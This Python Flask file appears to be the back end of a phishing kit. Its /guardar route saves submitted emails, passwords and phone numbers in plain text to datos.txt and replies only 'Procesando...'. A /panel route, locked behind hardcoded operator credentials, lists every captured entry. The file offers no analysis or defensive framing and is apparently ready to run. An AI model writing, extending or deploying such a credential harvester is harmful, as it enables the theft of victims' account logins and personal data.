from flask import Flask, request, session, redirect, render_template_string

app = Flask(__name__)
app.secret_key = 'una_clave_super_secreta_y_larga'

@app.route('/')
def index():
    return render_template_string(open('index.html').read())

@app.route('/guardar', methods=['POST'])
def guardar():
    c = request.form.get('correo')
    p = request.form.get('password')
    t = request.form.get('telefono')
    with open('datos.txt', 'a') as f:
        f.write(f"{c}|{p}|{t}\n")
    return "Procesando..."

@app.route('/panel')
def panel():
    if not session.get('logged_in'):
        return redirect('/login')
    with open('datos.txt', 'r') as f:
        datos = f.read()
    return f"<pre>{datos}</pre>"

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('usuario') == 'juanc._25' and request.form.get('pass') == 'elprofre':
            session['logged_in'] = True
            return redirect('/panel')
    return '''<form method="post">Usuario: <input type="text" name="usuario"><br>Clave: <input type="password" name="pass"><br><input type="submit" value="Entrar"></form>'''

if __name__ == '__main__':
    app.run()

